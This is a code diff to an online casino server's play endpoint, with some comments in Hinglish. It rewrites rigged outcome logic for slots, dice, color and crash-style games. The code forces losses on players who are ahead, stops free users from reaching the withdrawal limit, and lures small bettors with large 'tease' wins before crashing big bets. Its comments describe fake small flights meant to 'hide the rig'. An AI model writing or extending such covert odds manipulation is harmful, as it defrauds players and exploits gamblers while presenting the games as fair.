@@ -35,12 +35,11 @@ app.post('/api/play', (req, res) => {
 
         if (bet <= 0) return res.json({ success: false, error: "Invalid Bet" });
 
-        // Initialize User
+        // Initialize User if new
         if (!userStats[uid]) {
             userStats[uid] = { spins: 0, totalBet: 0, totalWon: 0, lifetimeDeposit: 0 };
         }
         
-        // Agar user depositor pass karta hai, assume usne kuch na kuch deposit kiya hi hai
         if(depositorStatus && userStats[uid].lifetimeDeposit === 0) {
             userStats[uid].lifetimeDeposit = userBalance; 
         }
@@ -49,6 +48,7 @@ app.post('/api/play', (req, res) => {
         userStats[uid].totalBet += bet;
         
         // P&L Logic: Positive means user is in LOSS (Casino is winning)
+        // Negative means user is in PROFIT (User is winning)
         let userNetLoss = userStats[uid].totalBet - userStats[uid].totalWon;
 
         globalStats.totalBetsReceived += bet;
@@ -63,42 +63,46 @@ app.post('/api/play', (req, res) => {
         let crashPoint = 0;
 
         // ========================================================
-        // 🛑 THE MASTERMIND LOGIC (Net Loss & VIP Control) 🛑
+        // 🛑 THE MASTERMIND LOGIC (Bet-Size & Loop Trap) 🛑
         // ========================================================
         
         let forceLoss = false;
         let forceWin = false;
+        let allowHighFlight = false; // For teasing up to 5x-7x
 
         if (depositorStatus) {
             // 💎 VIP (Depositor) Mode: "Slow Bleed"
-            // Let them win back up to 75% of their total loss to keep them playing long.
             let maxAllowedWin = userNetLoss * 0.75; 
             
-            // If they are overall in profit (NetLoss is negative), kill them quickly
             if (userNetLoss < 0) {
                 forceLoss = true;
             } else if (bet * 2 <= maxAllowedWin) {
-                // Safe to give a small 2x win
-                if (rnd < 400000) forceWin = true; // 40% chance to win to keep them hooked
+                if (rnd < 400000) forceWin = true; 
             }
             
         } else {
-            // 🆓 FREE USER Mode: "The Greed Trap" & "Lucky 5%"
+            // 🆓 FREE USER Mode: "The Size Trap & Cross-Game Tracking"
             if (userBalance > WITHDRAWAL_LIMIT * 0.8) {
-                // User is near withdrawal limit (e.g. 2400+ coins)
-                
-                if (extraProfitPool > WITHDRAWAL_LIMIT && rnd < 100000) {
-                    // 10% Chance: If casino has extra profit, let this lucky free user win and reach 3000!
-                    forceWin = true;
-                } else {
-                    // Casino has no extra profit OR unlucky. Kill them before they reach 3000.
-                    forceLoss = true; 
-                }
+                if (extraProfitPool > WITHDRAWAL_LIMIT && rnd < 100000) forceWin = true;
+                else forceLoss = true; 
             } else {
-                // User is far from 3000. Let them play naturally, tease them with small wins.
-                if (userNetLoss < 0) {
-                    // If free user somehow got in massive profit early, kill them
-                    forceLoss = true;
+                // 🔥 NEW: BET-SIZE BASED LOGIC (The Loop Trap) 🔥
+                if (bet <= 30) {
+                    // 🤏 SMALL BET: Tease them! Give them confidence.
+                    if (rnd < 300000) { 
+                        allowHighFlight = true; // 30% chance to reach 4x - 7.5x
+                    } else if (rnd < 700000) {
+                        forceWin = true; // 40% chance to reach 2x - 3.5x
+                    }
+                } else {
+                    // 💰 BIG BET: Trap them!
+                    if (userNetLoss < 0) {
+                        // User made profit from small bets, now betting big? SMASH HIM!
+                        forceLoss = true;
+                    } else {
+                        // Normal big bet, high chance of early crash
+                        if (rnd < 750000) forceLoss = true; // 75% chance to kill early
+                    }
                 }
             }
         }
@@ -109,17 +113,15 @@ app.post('/api/play', (req, res) => {
         if (gameName.includes("vortex") || gameName.includes("slot") || gameName.includes("plinko")) {
             if (isBankrupt || forceLoss) {
                 multiplier = (Math.random() < 0.8) ? 0 : 1.2; 
+            } else if (allowHighFlight) {
+                multiplier = 5.0; // Small bet tease in slots
             } else if (forceWin) {
                 multiplier = (Math.random() < 0.5) ? 2.0 : 2.5; 
             } else {
-                if (rnd < 600000) multiplier = 0; // 60% Loss
-                else if (rnd < 850000) multiplier = 1.2; // 25% Small Win
-                else if (rnd < 970000) multiplier = 2.0; // 12% Medium Win
-                else {
-                    if (depositorStatus && userStats[uid].spins >= 1000) multiplier = 100.0;
-                    else if (userNetLoss >= (bet * 5)) multiplier = 5.0;
-                    else multiplier = 2.5;
-                }
+                if (rnd < 600000) multiplier = 0; 
+                else if (rnd < 850000) multiplier = 1.2; 
+                else if (rnd < 970000) multiplier = 2.0; 
+                else multiplier = 2.5;
             }
         }
         // ========================================================
@@ -128,11 +130,10 @@ app.post('/api/play', (req, res) => {
         else if (gameName.includes("dice") || gameName.includes("toss") || gameName.includes("color") || gameName.includes("cup") || gameName.includes("flip")) {
             if (isBankrupt || forceLoss) {
                 multiplier = 0;
-            } else if (forceWin) {
-                multiplier = 1.8; // Games like color/cups give 1.8x
+            } else if (forceWin || allowHighFlight) {
+                multiplier = 1.8; // Fixed odds max is usually 1.8x - 2.0x
             } else {
-                let winChance = 42; // Normal 42% win chance
-                if (depositorStatus && userNetLoss > bet * 10) winChance = 55; // Pity win for depositing losers
+                let winChance = 42; 
                 multiplier = (rnd < (winChance * 10000)) ? 1.8 : 0;
             }
         }
@@ -141,17 +142,22 @@ app.post('/api/play', (req, res) => {
         // ========================================================
         else if (gameName.includes("crash") || gameName.includes("chicken") || gameName.includes("road") || gameName.includes("mine")) {
             if (isBankrupt || forceLoss) {
-                // Must crash early! To hide the rig, don't always do 0x. Do 0x or a fake small flight.
-                crashPoint = (Math.random() < 0.5) ? 0 : (1.01 + Math.random() * 0.15); // Crash at 0x or 1.01-1.15x
-                multiplier = crashPoint; // For interactive, we return the crash point here
+                // To hide the rig, don't always do 0x. Crash early at 1.01x to 1.15x.
+                crashPoint = (Math.random() < 0.3) ? 0 : (1.01 + Math.random() * 0.14); 
+                multiplier = crashPoint; 
+            } else if (allowHighFlight) {
+                // 🔥 THE SMALL BET TEASE FLIGHT (Let them see 4x to 7.5x) 🔥
+                crashPoint = 4.0 + Math.random() * 3.5; 
+                multiplier = crashPoint;
             } else if (forceWin) {
-                crashPoint = 2.5 + Math.random() * 3; // Safe 2.5x to 5.5x
+                crashPoint = 2.0 + Math.random() * 1.5; // Safe 2.0x to 3.5x
                 multiplier = crashPoint;
             } else {
-                if (rnd < 600000) crashPoint = 0;                  // 60% crash at 0
-                else if (rnd < 850000) crashPoint = 1.2 + Math.random() * 0.5;   // 1.2x to 1.7x
-                else if (rnd < 970000) crashPoint = 1.8 + Math.random() * 1.5;   // 1.8x to 3.3x
-                else crashPoint = (userNetLoss >= (bet * 10)) ? (5.0 + Math.random() * 5) : 3.5; 
+                // Normal Distribution (If not trapped)
+                if (rnd < 600000) crashPoint = 0;                  
+                else if (rnd < 850000) crashPoint = 1.2 + Math.random() * 0.5;   
+                else if (rnd < 970000) crashPoint = 1.8 + Math.random() * 1.5;   
+                else crashPoint = 2.0 + Math.random() * 1.0; 
                 
                 multiplier = crashPoint;
             }
@@ -163,7 +169,6 @@ app.post('/api/play', (req, res) => {
         let winAmount = 0;
         
         // Interactive games (Crash, Chicken, Mines) handle cashout in a separate API call.
-        // We only instantly credit fixed games like Slots, Color, Flip.
         if (multiplier > 0 && !gameName.includes("mine") && !gameName.includes("hi-lo") && !gameName.includes("chicken") && !gameName.includes("road") && !gameName.includes("crash")) {
             winAmount = Math.floor(bet * multiplier);
             globalStats.totalPayoutsGiven += winAmount;
